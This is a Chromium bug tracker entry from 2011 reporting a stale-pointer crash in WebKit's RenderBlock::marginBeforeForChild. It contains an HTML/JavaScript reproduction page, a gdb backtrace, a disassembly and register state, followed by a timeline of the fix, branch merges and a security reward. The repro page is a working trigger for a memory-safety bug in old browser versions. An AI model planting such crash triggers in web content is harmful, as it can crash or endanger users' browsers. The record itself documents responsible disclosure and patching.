# Stale pointer in WebCore::RenderBlock::marginBeforeForChild

| Field | Value |
|-------|-------|
| **Issue ID** | [40090899](https://issues.chromium.org/issues/40090899) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ma...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-05-13 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Under certain circumstances, chromium will crash in WebCore::RenderBlock::marginBeforeForChild. It seems that the variable child is a stale pointer. In general, this seems to be a problem related to floats and display: list-item.

**VERSION**  

Chrome Version: Chromium 11.0.696.65 Ubuntu 10.10 (stable), Google Chrome 13.0.761.0 dev (dev)  

Operating System: Ubuntu 10.10 (32-bit)

**REPRODUCTION CASE**

<!DOCTYPE html>
<html>
<head><title>marginBeforeChild crash</title></head>
<body onload="boom();">
<span style="display: -webkit-inline-box">
<span id="span1">
<span><blockquote></blockquote></span>
<span><p style="float: left; border-style: inset;"></p></span>
</span>
<span id="span2" style="display: list-item"></span>
</span>
<script type="text/javascript">
function boom() {
span1 = document.getElementById('span1');
span2 = document.getElementById('span2');
tfoot = document.createElement('tfoot');
span2.appendChild(tfoot);
document.body.offsetTop;
span1.parentNode.removeChild(span1);
}
</script>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

(gdb) r  

Starting program: /usr/lib/chromium-browser/chromium-browser --single-process crash.html

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0xb03aeb70 (LWP 2668)]  

0x40800000 in ?? ()  

(gdb) bt  

#0 0x40800000 in ?? ()  

#1 0x01bb3cd3 in WebCore::RenderBlock::marginBeforeForChild (this=0x30698f0,  

child=0x3069808)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:6052  

#2 0x01bba1e7 in yPositionForFloatIncludingMargin (this=0x30698f0)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.h:477  

#3 WebCore::RenderBlock::addOverflowFromFloats (this=0x30698f0)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:1388  

#4 0x01bba24a in WebCore::RenderBlock::computeOverflow (this=0x30698f0,  

oldClientAfterEdge=38, recomputeFloats=false)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:1348  

#5 0x01bd016b in WebCore::RenderBlock::layoutBlock (this=0x30698f0,  

relayoutChildren=false, pageLogicalHeight=0)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:1258  

#6 0x01bb6980 in WebCore::RenderBlock::layout (this=0x30698f0)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:1120  

#7 0x01c2cf3a in WebCore::RenderListItem::layout (this=0x30698f0)  

at third\_party/WebKit/Source/WebCore/rendering/RenderListItem.cpp:243  

...

(gdb) disas  

Dump of assembler code for function WebCore::RenderBlock::marginBeforeForChild(WebCore::RenderBoxModelObject\*) const:  

0x01bb3ca0 <+0>: push %ebp  

0x01bb3ca1 <+1>: mov %esp,%ebp  

0x01bb3ca3 <+3>: sub $0x18,%esp  

0x01bb3ca6 <+6>: mov 0x8(%ebp),%eax  

0x01bb3ca9 <+9>: mov 0xc(%ebp),%edx  

0x01bb3cac <+12>: mov 0x4(%eax),%eax  

0x01bb3caf <+15>: movzbl 0x31(%eax),%eax  

0x01bb3cb3 <+19>: shr $0x4,%al  

0x01bb3cb6 <+22>: and $0x3,%eax  

0x01bb3cb9 <+25>: cmp $0x2,%eax  

0x01bb3cbc <+28>: je 0x1bb3cf8 <WebCore::RenderBlock::marginBeforeForChild(WebCore::RenderBoxModelObject\*) const+88>  

0x01bb3cbe <+30>: cmp $0x3,%eax  

0x01bb3cc1 <+33>: je 0x1bb3ce8 <WebCore::RenderBlock::marginBeforeForChild(WebCore::RenderBoxModelObject\*) const+72>  

0x01bb3cc3 <+35>: cmp $0x1,%eax  

0x01bb3cc6 <+38>: je 0x1bb3cd8 <WebCore::RenderBlock::marginBeforeForChild(WebCore::RenderBoxModelObject\*) const+56>  

0x01bb3cc8 <+40>: mov (%edx),%eax  

0x01bb3cca <+42>: mov %edx,(%esp)  

0x01bb3ccd <+45>: call \*0x290(%eax)  

---Type <return> to continue, or q <return> to quit---  

=> 0x01bb3cd3 <+51>: leave  

0x01bb3cd4 <+52>: ret  

0x01bb3cd5 <+53>: lea 0x0(%esi),%esi  

0x01bb3cd8 <+56>: mov (%edx),%eax  

0x01bb3cda <+58>: mov %edx,(%esp)  

0x01bb3cdd <+61>: call \*0x29c(%eax)  

0x01bb3ce3 <+67>: leave  

0x01bb3ce4 <+68>: ret  

0x01bb3ce5 <+69>: lea 0x0(%esi),%esi  

0x01bb3ce8 <+72>: mov (%edx),%eax  

0x01bb3cea <+74>: mov %edx,(%esp)  

0x01bb3ced <+77>: call \*0x294(%eax)  

0x01bb3cf3 <+83>: leave  

0x01bb3cf4 <+84>: ret  

0x01bb3cf5 <+85>: lea 0x0(%esi),%esi  

0x01bb3cf8 <+88>: mov (%edx),%eax  

0x01bb3cfa <+90>: mov %edx,(%esp)  

0x01bb3cfd <+93>: call \*0x298(%eax)  

0x01bb3d03 <+99>: leave  

0x01bb3d04 <+100>: ret  

End of assembler dump.  

(gdb) i r  

eax 0x3069650 50763344  

ecx 0x34f2400 55518208  

edx 0x3069808 50763784  

ebx 0x2f42f04 49557252  

esp 0xb03acaa0 0xb03acaa0  

ebp 0xb03acab8 0xb03acab8  

esi 0x35712c8 56038088  

edi 0x3568c20 56003616  

eip 0x1bb3cd3 0x1bb3cd3 <WebCore::RenderBlock::marginBeforeForChild(WebCore::RenderBoxModelObject\*) const+51>  

eflags 0x210297 [ CF PF AF SF IF RF ID ]  

cs 0x73 115  

ss 0x7b 123  

ds 0x7b 123  

es 0x7b 123  

fs 0x0 0  

gs 0x33 51

## Attachments

- [crash.html](attachments/crash.html) (text/html; charset=us-ascii, 647 B)
- [gdb.txt](attachments/gdb.txt) (text/plain; charset=us-ascii, 15.0 KB)

## Timeline

### in...@chromium.org (2011-05-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-05-13)

Filed webkit bug - https://bugs.webkit.org/show_bug.cgi?id=60780

### in...@chromium.org (2011-05-13)

http://trac.webkit.org/changeset/86448

### sc...@gmail.com (2011-05-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-05-13)

@inferno: seems like a trivial merge for M11 too, would you recommend it if we have another patch?

### in...@chromium.org (2011-05-13)

Yes very trivial and zero risk merge, atmost it just goes to the parent and does more relayout.

### [Deleted User] (2011-05-19)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-05-19)

merged to m11 in r86860 and m12 in r86862

### [Deleted User] (2011-05-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-05-22)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-05-23)

@MartyBarbella: nice work as always... and a provisional $1000 Chromium Security Reward. Fix should go to stable very shortly.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-06-09)

Invoice finalized; payment is in e-payment system; it can take a couple of weeks.

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/82546?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090899)*
